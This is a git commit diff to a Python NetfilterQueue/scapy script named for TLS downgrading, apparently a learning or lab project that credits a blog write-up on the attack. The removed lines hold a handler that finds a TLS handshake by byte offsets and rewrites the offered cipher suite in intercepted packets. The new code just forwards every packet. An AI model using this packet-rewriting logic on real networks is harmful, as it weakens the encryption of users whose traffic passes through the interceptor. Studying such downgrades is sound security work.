e5757a51b01fbc545fcf0403f79b235ff1c86626
Tess Sluijter <tsluyter@kilala.nl>
2020-10-08 08:59:26 +0200

    builds, runs, traffic goes through nfqueue and arrives ok.

--- TLS-downgrade/interceptor.py
+++ TLS-downgrade/interceptor.py
@@ -3,30 +3,19 @@
 # With many thanks to Ludovic Barman for their great write-up.
 # https://lbarman.ch/blog/downgrade-tls/
 #
+# Also, @XargsNotBombs makes the wonderful Illustrated TLS Connections site.
+# https://tls.ulfheim.net
+#
 
 from netfilterqueue import NetfilterQueue
-from scapy.all import *
+from scapy import *
 
 nfQueueID         = 0
 maxPacketsToStore = 100
 
-def packetReceived(pkt):
-  print("Accepted a new packet...")
-  ip = IP(pkt.get_payload())
-  if not ip.haslayer("Raw"):
-    pkt.accept();
-  else:
-    tcpPayload = ip["Raw"].load;
-    if tcpPayload[0] == 0x16 and tcpPayload[1] == 0x03 and tcpPayload[46] == 0x00 and tcpPayload[47] == 0x35:
-      # we located the Handshake
-      msgBytes = pkt.get_payload()       # msgBytes is read-only, copy it
-      msgBytes2 = [b for b in msgBytes]
-      msgBytes2[112] = 0x00
-      msgBytes2[113] = 0x2F
-      pkt.set_payload(bytes(msgBytes2))
-      pkt.accept()
-    else:
-      pkt.accept();
+def packetReceived(pkt):             # called each time a packet is put in the queue
+  print("New packet received.")
+  pkt.accept();                      # accepts and forwards this packet to the appropriate network address
 
 print("Binding to NFQUEUE", nfQueueID)
 nfqueue = NetfilterQueue()
